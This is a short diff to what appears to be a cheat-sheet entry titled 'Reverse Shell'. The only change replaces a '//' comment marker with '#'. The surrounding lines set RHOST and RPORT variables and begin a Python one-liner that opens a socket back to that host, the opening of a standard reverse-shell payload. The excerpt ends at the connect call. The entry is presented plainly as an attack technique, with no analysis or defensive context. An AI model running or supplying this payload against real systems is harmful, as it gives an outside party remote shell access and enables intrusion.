@@ -1,5 +1,5 @@
 *Reverse Shell*
-export RHOST=192.168.0.0 //Put current IP here
+export RHOST=192.168.0.0 #Put current IP here
 export RPORT=12345
 python -c 'import sys,socket,os,pty;s=socket.socket()
 s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
